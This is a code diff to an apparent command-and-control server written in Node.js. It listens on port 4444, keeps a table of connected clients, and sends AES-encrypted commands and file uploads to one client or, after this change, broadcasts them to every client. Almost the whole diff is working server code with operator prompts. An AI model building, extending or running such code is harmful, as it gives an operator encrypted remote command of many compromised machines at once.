@@ -9,6 +9,7 @@ const HOST = '0.0.0.0';
 const PORT = 4444;
 
 // --- Encryption Key Configuration ---
+// TODO: Connect using the ECDH algorithm
 const AES_KEY = Buffer.from('Hexadecimal_format_aes_key', 'hex');
 
 if (AES_KEY.length !== 32) {
@@ -23,6 +24,11 @@ if (!fs.existsSync(UPLOAD_DIR)) {
     fs.mkdirSync(UPLOAD_DIR, { recursive: true });
     console.log(`[Config] Directory created successfully: ${UPLOAD_DIR}`);
 }
+
+// --- Client Management and Server Logic ---
+const clients = new Map();
+const incomingFileStates = new Map();
+const clientBuffers = new Map();
 
 // --- Encryption and Decryption Functions ---
 function encrypt(data) {
@@ -48,10 +54,16 @@ function decrypt(data) {
     }
 }
 
-// --- Client Management and Server Logic ---
-const clients = new Map();
-const incomingFileStates = new Map();
-const clientBuffers = new Map();
+function sendPacket(socket, payload) {
+    try {
+        const encryptedPayload = encrypt(payload);
+        const lengthPrefix = Buffer.alloc(4);
+        lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
+        socket.write(Buffer.concat([lengthPrefix, encryptedPayload]));
+    } catch (e) {
+        console.error(`[!] Send Error: ${e.message}`);
+    }
+}
 
 const server = net.createServer(socket => {
     const addr = `${socket.remoteAddress}:${socket.remotePort}`;
@@ -212,17 +224,26 @@ rl.prompt();
 
 rl.on('line', async line => {
     const parts = line.trim().split(' ');
+
+    if (parts.length < 2) {
+        console.log('Usage: <IP:Port|all> <command>');
+        console.log('Currently connected clients:', Array.from(clients.keys()));
+        rl.prompt();
+        return;
+    }
+
     const target = parts[0];
     const commandType = parts[1] ? parts[1].toUpperCase() : '';
     const cmdArgs = parts.slice(2).join(' ');
 
-    const clientSocket = clients.get(target);
+    // if you want to target a specific client
+    // const clientSocket = clients.get(target);
 
-    if (!clientSocket) {
-        console.log('Specified client not found. Currently connected clients:', Array.from(clients.keys()));
-        rl.prompt();
-        return;
-    }
+    // if (!clientSocket) {
+    //     console.log('Specified client not found. Currently connected clients:', Array.from(clients.keys()));
+    //     rl.prompt();
+    //     return;
+    // }
 
     let payloadToSend;
 
@@ -247,10 +268,7 @@ rl.on('line', async line => {
 
         try {
             const fileContent = fs.readFileSync(localFilePath);
-
             const actualRemotePathForClient = remoteFilePath || path.basename(localFilePath);
-
-
             const encodedRemotePath = Buffer.from(actualRemotePathForClient, 'utf8').toString('base64');
 
             payloadToSend = Buffer.concat([
@@ -263,8 +281,7 @@ rl.on('line', async line => {
             rl.prompt();
             return;
         }
-    }
-    else {
+    } else {
         const commandText = `${commandType} ${cmdArgs}`.trim();
         if (!commandText) {
             console.log('Invalid command format. Example: [client_address] command');
@@ -275,14 +292,36 @@ rl.on('line', async line => {
         console.log(`Sending general command to [${target}]: "${commandText}"`);
     }
 
-    try {
-        const encryptedPayload = encrypt(payloadToSend);
-        const lengthPrefix = Buffer.alloc(4);
-        lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
-        clientSocket.write(Buffer.concat([lengthPrefix, encryptedPayload]));
-
-    } catch (e) {
-        console.error(`[!] Encryption or transmission error: ${e.message}`);
+    if (target.toUpperCase() === 'ALL') {
+        if (clients.size === 0) console.log("[!] No clients.");
+        else {
+            let count = 0;
+            for (const socket of clients.values()) {
+                sendPacket(socket, payloadToSend);
+                count++;
+            }
+            console.log(`[+] Broadcasted to ${count} clients.`);
+        }
+    } else {
+        const socket = clients.get(target);
+        if (!socket) {
+            console.log(`[!] Client '${target}' not found. Available:`, Array.from(clients.keys()));
+        } else {
+            sendPacket(socket, payloadToSend);
+            console.log(`[+] Sent to ${target}`);
+        }
     }
+
+    // if you want to target a specific client
+    // try {
+    //     const encryptedPayload = encrypt(payloadToSend);
+    //     const lengthPrefix = Buffer.alloc(4);
+    //     lengthPrefix.writeUInt32BE(encryptedPayload.length, 0);
+    //     clientSocket.write(Buffer.concat([lengthPrefix, encryptedPayload]));
+
+    // } catch (e) {
+    //     console.error(`[!] Encryption or transmission error: ${e.message}`);
+    // }
+    
     rl.prompt();
 });
